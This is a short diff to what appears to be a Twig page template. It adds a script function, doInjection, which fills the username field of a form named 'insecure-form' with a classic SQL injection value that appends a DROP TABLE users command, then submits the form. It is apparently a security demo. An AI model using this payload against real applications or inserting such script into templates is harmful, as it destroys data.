@@ -9,6 +9,17 @@
         {% endblock %}
 
         {% block javascripts %}
+            <script>
+                function doInjection() 
+                {
+                    const form = document.getElementById('insecure-form');
+                    if (form) 
+                    {
+                        form.username.value = "hacker'); DROP TABLE users; --";
+                        form.submit();
+                    }
+                }
+            </script>
         {% endblock %}
     </head>
     <body>
